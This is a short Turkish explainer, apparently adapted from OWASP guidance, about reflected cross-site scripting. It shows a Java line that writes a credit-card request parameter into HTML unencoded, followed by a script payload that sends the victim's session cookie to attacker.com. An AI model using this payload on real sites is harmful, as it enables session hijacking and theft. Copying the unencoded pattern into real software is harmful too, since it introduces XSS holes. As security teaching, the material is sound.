# Örnek Saldırı Senaryoları

Örnek uygulamamızda aşağıdaki gibi kullanıcıdan gelen parametre “kodlama” işlemi uygulamadan doğrudan HTML içerisinde kullanılmaktadır.

| <p><strong>(String) page += "&#x3C;input name='creditcard' type='TEXT'</strong></p><p><strong>value='" + request.getParameter("CC") + "'>";</strong></p> |
| -------------------------------------------------------------------------------------------------------------------------------------------------------- |

Saldırgan GET parametresi “CC” değerine aşağıdaki zararlı JavaScript kodunu gönderebilir.

| <p><strong>'>&#x3C;script>document.location=</strong></p><p><strong>'http://www.attacker.com/cgi-bin/cookie.cgi?</strong></p><p><strong>foo='+document.cookie&#x3C;/script>'.</strong></p> |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |

Buradaki koddan da anlayabileceğimiz gibi saldırgan gönderilen bağlantıyı tıklayan kişinin oturum çerez bilgisini alır ve kendi kontrolündeki bir sayfaya gönderir. Bu sayede kullanıcının mevcut oturumunu ele geçirmiş olur.
